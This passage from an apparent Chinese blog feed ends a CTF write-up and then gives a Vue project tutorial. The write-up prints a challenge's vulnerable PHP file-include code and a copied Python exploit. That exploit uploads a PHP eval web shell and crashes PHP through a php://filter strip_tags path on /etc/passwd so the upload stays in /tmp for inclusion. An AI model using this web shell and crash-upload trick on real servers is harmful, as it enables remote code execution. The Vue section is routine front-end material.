req.text:</span><br><span class="line">        print(req.text,url+<span class="string">&quot;name=&#123;&#125;&amp;pass=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(urllib.parse.quote(b),a))</span><br><span class="line">        </span><br></pre></td></tr></table></figure>

<p>?然而实际做的时候把cookies的值丢进去当作password的就过去了。</p>
<p><img src="image-20201030092846076.png" alt="image-20201030092846076"></p>
<p>读取到三个php文件：</p>
<p>flflflflag.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/data|input|zip/is&#x27;</span>,$file))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>($file);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">@$name=$_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">@$pass=$_GET[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(md5($secret.$name)===$pass)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span></span><br><span class="line"><span class="string">           window.location.href=&quot;flflflflag.php&quot;;</span></span><br><span class="line"><span class="string">	&lt;/script&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	setcookie(<span class="string">&quot;Hash&quot;</span>,md5($secret.$name),time()+<span class="number">3600000</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;username/password error&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;!--md5($secret.$name)===$pass --&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>config.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$secret=<span class="string">&#x27;%^$&amp;$#fffdflag_is_not_here_ha_ha&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用dirb还能扫出来一个dir.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">		<span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">		[<span class="number">0</span>]=&gt;</span><br><span class="line">		<span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;.&quot;</span></span><br><span class="line">		[<span class="number">1</span>]=&gt;</span><br><span class="line">		<span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;..&quot;</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">include</span>($_GET[<span class="string">&quot;file&quot;</span>])&lt;/body&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里会列出tmp目录下的所有文件，</p>
<p>那看来还是要写🐎进去啊，可是伪协议被过滤了该怎么写🐎呢？</p>
<p>参考文章：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;183046</span><br></pre></td></tr></table></figure>

<p>从这篇文章中我们可以知道，当PHP陷入崩溃的时候他会自动的重启，清理掉自己的内存，但是与此同时这就会导致PHP会停止自己手头的工作，这样的话于此同时我们直接POST一段数据，将会被php保存至tmp目录下没有停下。随机生成一个文件，但是又根据题目的dir.php，可以让我们看见tmp目录下有什么，所以直接包裹即可~</p>
<p>抄来的exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">payload = <span class="string">&quot;&lt;?php eval($_POST[a]);?&gt;&quot;</span></span><br><span class="line">file_data=&#123;</span><br><span class="line">   <span class="string">&#x27;file&#x27;</span>: BytesIO(payload.encode())</span><br><span class="line">&#125;</span><br><span class="line">url=<span class="string">&quot;http://a53738f6-1115-449b-b4af-167a2c1a5b1a.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">   r=requests.post(url=url,files=file_data,allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">        print(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>重点就是用string.strip_tags这一点构造出php的内存溢出即可得到。之后访问dir.php可以看见有什么文件成功上传：</p>
<p><img src="image-20201031145743370.png" alt="image-20201031145743370"></p>
<p>进行文件包含即可</p>
<p><img src="image-20201031150107473.png" alt="image-20201031150107473"></p>
<p>flag一样的PHP info（）当中</p>
]]></content>
  </entry>
  <entry>
    <title>Vue总结</title>
    <url>/2020/10/25/Vue%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="Vue-part"><a href="#Vue-part" class="headerlink" title="Vue part"></a>Vue part</h1><p>总结了前端项目的搭建，以及自己在这次作品中学到了什么</p>
<a id="more"></a>

<p>Vue我认为学下来就是很爽，基本上不用再各种去绑定JS当中的dom元素了（getElementById什么的）</p>
<p>其中基础源码，有一个index.html</p>
<h2 id="1-index-html"><a href="#1-index-html" class="headerlink" title="1.index.html"></a>1.index.html</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width,initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&lt;%= BASE_URL %&gt;favicon.ico&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">%=</span> <span class="attr">htmlWebpackPlugin.options.title</span> %&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">noscript</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">strong</span>&gt;</span>We&#x27;re sorry but <span class="tag">&lt;<span class="name">%=</span> <span class="attr">htmlWebpackPlugin.options.title</span> %&gt;</span> doesn&#x27;t work properly without JavaScript enabled. Please enable it to continue.<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- built files will be auto injected --&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>启动的时候有一个main.js，APP.vue等等。现在讲一下我是怎么做下来的，我利用到的框架是antdv，再package.json当中可以找到</p>
<h2 id="2-package-json"><a href="#2-package-json" class="headerlink" title="2.package.json"></a>2.package.json</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&quot;dependencies&quot;: &#123;</span><br><span class="line">    &quot;@antv/data-set&quot;: &quot;^0.11.7&quot;,</span><br><span class="line">    &quot;@antv/g2&quot;: &quot;^4.0.15&quot;,</span><br><span class="line">    &quot;@sven0706/websocket&quot;: &quot;^1.0.1&quot;,</span><br><span class="line">    &quot;ant-design-vue&quot;: &quot;^1.6.5&quot;,</span><br><span class="line">    &quot;axios&quot;: &quot;^0.20.0&quot;,</span><br><span class="line">    &quot;core-js&quot;: &quot;^3.6.5&quot;,</span><br><span class="line">    &quot;echarts&quot;: &quot;^4.9.0&quot;,</span><br><span class="line">    &quot;html2canvas&quot;: &quot;^1.0.0-rc.7&quot;,</span><br><span class="line">    &quot;js-cookie&quot;: &quot;^2.2.1&quot;,</span><br><span class="line">    &quot;jspdf&quot;: &quot;^2.1.1&quot;,</span><br><span class="line">    &quot;less&quot;: &quot;^3.12.2&quot;,</span><br><span class="line">    &quot;less-loader&quot;: &quot;^7.0.1&quot;,</span><br><span class="line">    &quot;rc-resize-observer&quot;: &quot;^0.2.5&quot;,</span><br><span class="line">    &quot;react&quot;: &quot;^16.13.1&quot;,</span><br><span class="line">    &quot;react-dom&quot;: &quot;^16.13.1&quot;,</span><br><span class="line">    &quot;react-window&quot;: &quot;^1.8.5&quot;,</span><br><span class="line">    &quot;vant&quot;: &quot;^2.10.9&quot;,</span><br><span class="line">    &quot;vue&quot;: &quot;^2.6.11&quot;,</span><br><span class="line">    &quot;vue-print-nb&quot;: &quot;^1.5.0&quot;,</span><br><span class="line">    &quot;vue-router&quot;: &quot;^3.4.5&quot;,</span><br><span class="line">    &quot;vuex&quot;: &quot;^3.5.1&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;devDependencies&quot;: &#123;</span><br><span class="line">    &quot;@vue/cli-plugin-babel&quot;: &quot;~4.5.0&quot;,</span><br><span class="line">    &quot;@vue/cli-plugin-eslint&quot;: &quot;~4.5.0&quot;,</span><br><span class="line">    &quot;@vue/cli-service&quot;: &quot;~4.5.0&quot;,</span><br><span class="line">    &quot;babel-eslint&quot;: &quot;^10.1.0&quot;,</span><br><span class="line">    &quot;eslint&quot;: &quot;^6.7.2&quot;,</span><br><span class="line">    &quot;eslint-plugin-vue&quot;: &quot;^6.2.2&quot;,</span><br><span class="line">    &quot;vue-template-compiler&quot;: &quot;^2.6.11&quot;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<p>要用的时候再项目根目录下cnpm -i即可。</p>
<p>讲一下路由该怎么做把，首先创建一个</p>
<h2 id="3-router-js"><a href="#3-router-js" class="headerlink" title="3.router.js"></a>3.router.js</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//引入vue</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span><br><span class="line"><span class="comment">//引入vue-router</span></span><br><span class="line"><span class="keyword">import</span> VueRouter <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>在Vue当中，所有需要引用的东西需要用Vue.use之后才会生效</p>
<p>故我们构造之后的代码框架大致如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//引入vue</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span><br><span class="line"><span class="comment">//引入vue-router</span></span><br><span class="line"><span class="keyword">import</span> VueRouter <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Vue.use(VueRouter)</span><br><span class="line"></span><br><span class="line"><span class="comment">//引用page1页面</span></span><br><span class="line"><span class="keyword">import</span> upload  <span class="keyword">from</span> <span class="string">&#x27;./components/upload.vue&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> login <span class="keyword">from</span> <span class="string">&#x27;./components/login.vue&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义routes路由的集合，数组类型</span></span><br><span class="line"><span class="keyword">const</span> routes=[</span><br><span class="line">    <span class="comment">//单个路由均为对象类型，path代表的是路径，component代表组件</span></span><br><span class="line">    &#123;<span class="attr">path</span>:<span class="string">&#x27;/upload&#x27;</span>,<span class="attr">component</span>:upload&#125;,</span><br><span class="line">    &#123;<span class="attr">path</span>:<span class="string">&#x27;/login&#x27;</span>,<span class="attr">component</span>:login&#125;,</span><br></pre></td></tr></table></figure>

<p>一个Vue文件的格式如下：</p>
<h2 id="4-主入口"><a href="#4-主入口" class="headerlink" title="4.主入口"></a>4.主入口</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id&#x3D;&quot;app&quot;&gt; </span><br><span class="line">      &lt;router-view&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#39;App&#39;,</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在template当中构造HTML的代码，script当中构造当前页面的JS，而style设置中写css。如果不做限定，CSS将会是全局生效的！</p>
<p>而APP作为主页面，只需要写一句话即可：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">router-view</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>这一句话的意思代码将页面内容托管给Vue，根据vue的Router来显示内容 </p>
<p>而Router的设置在main.js当中（实际上，几乎所有的设置都放在main.js当中进行统一设置）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  router,</span><br><span class="line">  render: <span class="function"><span class="params">h</span> =&gt;</span> h(App),</span><br><span class="line">&#125;).$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>在main.js导入的模块可以全项目生效，如果想要普通的生效一个模块，这样构造：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Button, Table, Menu, Switch,Icon,Layout,Upload,Breadcrumb,FormModel,Input,Divider,message,Form,Alert,Spin,Modal  &#125; <span class="keyword">from</span> <span class="string">&#x27;ant-design-vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//在下面：</span></span><br><span class="line">Vue.use(Modal)</span><br><span class="line">Vue.use(Spin)</span><br><span class="line">Vue.use(Alert)</span><br><span class="line">Vue.use(Form)</span><br><span class="line">Vue.use(axios)</span><br><span class="line">Vue.use(htmlToPdf)</span><br><span class="line">Vue.use(Divider)</span><br><span class="line">Vue.use(Input)</span><br><span class="line">Vue.use(FormModel)</span><br></pre></td></tr></table></figure>

<p>如果想要修改Vue默认的设置，例如我们导入axios的时候这样构造：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line">Vue.prototype.$http = axios</span><br></pre></td></tr></table></figure>

<p>之后我构造了一个公共使用的Vue模板，也就是菜单栏的插件，我是创建了一个commons文件夹，并写在里面</p>
<h2 id="5-插槽"><a href="#5-插槽" class="headerlink" title="5.插槽"></a>5.插槽</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a-layout</span> <span class="attr">id</span>=<span class="string">&quot;components-layout-demo-side&quot;</span> <span class="attr">style</span>=<span class="string">&quot;min-height: 100vh&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a-layout-sider</span> <span class="attr">v-model</span>=<span class="string">&quot;collapsed&quot;</span> <span class="attr">width</span>=<span class="string">&quot;12%&quot;</span> <span class="attr">collapsible</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;logo&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-menu</span> <span class="attr">theme</span>=<span class="string">&quot;dark&quot;</span> <span class="attr">:default-selected-keys</span>=<span class="string">&quot;[&#x27;1&#x27;]&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;inline&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;upload&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">type</span>=<span class="string">&quot;cloud-download&quot;</span> /&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">                  文件上传  </span><br><span class="line">              <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-sub-menu</span> <span class="attr">key</span>=<span class="string">&quot;sub1&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> <span class="attr">slot</span>=<span class="string">&quot;title&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">type</span>=<span class="string">&quot;area-chart&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">                  数据分析</span><br><span class="line">                <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;report&quot;</span>&gt;</span></span><br><span class="line">              日志分析</span><br><span class="line">            <span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;getpdf&quot;</span>&gt;</span></span><br><span class="line">              获取报告</span><br><span class="line">            <span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">a-sub-menu</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-sub-menu</span> <span class="attr">key</span>=<span class="string">&quot;sub2&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> <span class="attr">slot</span>=<span class="string">&quot;title&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">type</span>=<span class="string">&quot;dashboard&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>立体数据<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;5&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;attackaddress&quot;</span>&gt;</span></span><br><span class="line">              攻击溯源</span><br><span class="line">            <span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;8&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;watchlog&quot;</span>&gt;</span></span><br><span class="line">            实时监控</span><br><span class="line">            <span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">a-sub-menu</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;9&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;setting&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">type</span>=<span class="string">&quot;setting&quot;</span> /&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span>&gt;</span>系统设置<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;10&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;showModal&quot;</span>&gt;</span>        </span><br><span class="line">          <span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">type</span>=<span class="string">&quot;login&quot;</span> /&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> &gt;</span>登出<span class="tag">&lt;/<span class="name">span</span>&gt;</span> </span><br><span class="line">          <span class="tag">&lt;<span class="name">a-modal</span> <span class="attr">v-model</span>=<span class="string">&quot;visible&quot;</span> <span class="attr">title</span>=<span class="string">&quot;Basic Modal&quot;</span> @<span class="attr">ok</span>=<span class="string">&quot;handleOk&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>是否确定登出？<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">          <span class="tag">&lt;/<span class="name">a-modal</span>&gt;</span>        </span><br><span class="line">        <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">a-menu</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a-layout-sider</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a-layout</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-layout-header</span> <span class="attr">theme</span>=<span class="string">dark</span> &gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;/<span class="name">a-layout-header</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- 上面是在导航栏最顶端加东西 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-layout-content</span> <span class="attr">style</span>=<span class="string">&quot;margin: 0 16px&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">      <span class="tag">&lt;/<span class="name">a-layout-content</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-layout-footer</span> <span class="attr">style</span>=<span class="string">&quot;text-align: center&quot;</span>&gt;</span></span><br><span class="line">        Ant Design ©2018 Created by Ant UED</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a-layout-footer</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a-layout</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">a-layout</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>需要注意的是：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在Vue当中，这个相当于一个插槽，也就是，呃，类似一个include函数，我们如果想要把他当作模板的话就需要这样写，比如我们的report.vue</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> menus <span class="keyword">from</span> <span class="string">&#x27;../commons/menu&#x27;</span></span><br><span class="line"></span><br><span class="line">&lt;menu&gt;&lt;/menu&gt;</span><br><span class="line"><span class="comment">//在下面导入，之后再html当中使用即可</span></span><br><span class="line">components:&#123;</span><br><span class="line">        menus,</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure>

<h2 id="6-路由守卫"><a href="#6-路由守卫" class="headerlink" title="6.路由守卫"></a>6.路由守卫</h2><p>我们前端肯定是要鉴权的吧，不然用户就可对前端为所欲为了，故我们构造一个局部守卫是这样的：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">beforeRouteEnter</span>(<span class="params">to,<span class="keyword">from</span>,next</span>)</span> &#123;</span><br><span class="line">            axios.post(<span class="string">&#x27;/report&#x27;</span>).then(<span class="function"><span class="params">res</span> =&gt;</span>&#123;</span><br><span class="line">              <span class="keyword">if</span> (res.data == <span class="number">0</span>) next(&#123; <span class="attr">path</span>:<span class="string">&#x27;/&#x27;</span> &#125;);</span><br><span class="line">              <span class="keyword">else</span> next();</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;,</span><br></pre></td></tr></table></figure>

<p>这样的话，再访问该路由，离开路由的时候都会先访问一次页面，我们后端写好代码，如果用户没有登陆的话，就会返回到index页面了。</p>
<h2 id="7-期待值"><a href="#7-期待值" class="headerlink" title="7.期待值"></a>7.期待值</h2><p>这个理解起来单靠嘴说较为僵硬，需要实战中使用才可以领悟的清楚，比如我们的html代码中构造如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a-button</span> <span class="attr">type</span>=<span class="string">&quot;danger&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;&#123;margin:&#x27;-20px 0px 0px 200px&#x27;&#125;&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;ExportSavePdf(htmlTitle,nowTime)&quot;</span>&gt;</span>报告生成<span class="tag">&lt;/<span class="name">a-button</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>（通过Vue框架，我们可以使用@click的方法来处理各种事件，之后填入一个函数，并写入函数的实参，而实参不一定是一定出现的，所以我们的实参可能会出现为null的情况，而Vue不想出现这种情况，所以要求我们填入默认值，也就是期待值，当我们没有填入参数的时候自动填入的参数</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      data,</span><br><span class="line">      columns,</span><br><span class="line">      htmlTitle: <span class="string">&#x27;report&#x27;</span>,</span><br><span class="line">      keyName: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<h2 id="8-设置默认值"><a href="#8-设置默认值" class="headerlink" title="8.设置默认值"></a>8.设置默认值</h2><p>有的时候，我们可能想在用户访问之前的时候直接获取数据，这样的话就可以直接拿到数据了，于是我们可以通过如下方法：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mounted() &#123;</span><br><span class="line">    <span class="comment">// this.drawChart();</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>以这种方式填入的值，当用户访问页面的时候便会自动进行调用。例子：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">axios.post(<span class="string">&#x27;/setting&#x27;</span>).then(<span class="function"><span class="params">res</span>=&gt;</span>&#123;</span><br><span class="line">      <span class="built_in">this</span>.usersData(res.data);</span><br><span class="line">      <span class="comment">// location.reload()</span></span><br><span class="line">    &#125;).catch(<span class="function"><span class="params">err</span>=&gt;</span>&#123;</span><br><span class="line">      <span class="comment">// console.log(err)</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

